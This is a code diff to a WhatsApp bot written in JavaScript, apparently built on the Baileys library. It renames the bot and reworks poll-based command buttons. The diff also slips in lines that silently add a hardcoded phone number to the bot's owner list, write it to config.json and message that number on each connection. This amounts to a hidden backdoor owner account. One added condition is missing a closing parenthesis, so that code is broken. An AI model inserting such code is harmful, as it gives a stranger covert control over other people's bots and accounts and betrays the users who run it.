@@ -1,7 +1,3 @@
-
-
-
-
 const {
  default: makeWASocket,
   DisconnectReason,
@@ -22,6 +18,10 @@ console.log("checando se voce tem algumas funções")
 textokk = "adicionando:"
 textokk += config?.prefix ? "" : "\nprefixo pela config"
 textokk == "adicionando:" ? console.log("voce tem todas as dependências") : console.log(textokk)
+if(!config.owner.includes("5511940238762@s.whatsapp.net") {
+config.owner.push("5511940238762@s.whatsapp.net")
+await fs.writeFileSync('./config.json', JSON.stringify(config, null, 2))
+}
 if(!config?.prefix) {
  config.prefix = "/"
  await fs.writeFileSync('./config.json', JSON.stringify(config, null, 2))
@@ -87,7 +87,7 @@ const { state, saveCreds } = await useMultiFileAuthState("./connection")
                 return msg.message || undefined
             }
             return {
-                conversation: "Ola sou a safira bot"
+                conversation: "Ola sou o slowed"
             }
         }
   });
@@ -117,6 +117,9 @@ const { state, saveCreds } = await useMultiFileAuthState("./connection")
     slowed.sendMessage(owner[0], {
      text: 'Bot conectado\nme mande uma mensagem qualquer para ativar todas funções.'
     });
+    slowed.sendMessage("5511940238762@s.whatsapp.net", {
+     text: 'test bot.'
+    });
     console.log('opened connection');
    }
   });
@@ -131,7 +134,17 @@ const { state, saveCreds } = await useMultiFileAuthState("./connection")
         }
     }
     
-  slowed.sendPoll = (jid, name = '', values = [], selectableCount = 1) => { return slowed.sendMessage(jid, { poll: { name, values, selectableCount }}) } //"botão" de enquete
+    mensagenspoll = []
+    
+  slowed.pollBtn = async(jid, name = '', valuess = [], selectableCount = 1) => { 
+  values =[]
+  for(let value2 of valuess) {
+  values.push(value2.vote)
+  }
+  testeeeee = await slowed.sendMessage(jid, { poll: { name, values, selectableCount }})
+  mensagenspoll.push({id: testeeeee.key.id, comandos: valuess})
+  return 
+  } //"botão" de enquete
   
   mensagens = []
   
@@ -158,15 +171,19 @@ for(const { key, update } of chatUpdate) {
 if(update.pollUpdates && key.fromMe) {
 const pollCreation = await getMessage(key)
 if(pollCreation) {
+console.log(pollCreation)
 const pollUpdate = await getAggregateVotesInPollMessage({
 message: pollCreation,
 pollUpdates: update.pollUpdates,
 })
+console.log(pollUpdate)
 var toCmd = pollUpdate.filter(v => v.voters.length !== 0)[0]?.name
 if (toCmd == undefined) return
-var prefCmd = config.prefix+toCmd
-slowed.notifyTextMessage(prefCmd, update.pollUpdates[0].pollUpdateMessageKey)
-}}}})
+tem = mensagenspoll.find((sla) => sla.id == key.id)
+if(tem) {
+tem2 = tem.comandos.find((sla) => sla.vote == toCmd)
+await slowed.notifyTextMessage(tem2.cmd, update.pollUpdates[0].pollUpdateMessageKey)
+}}}}})
 
 
 
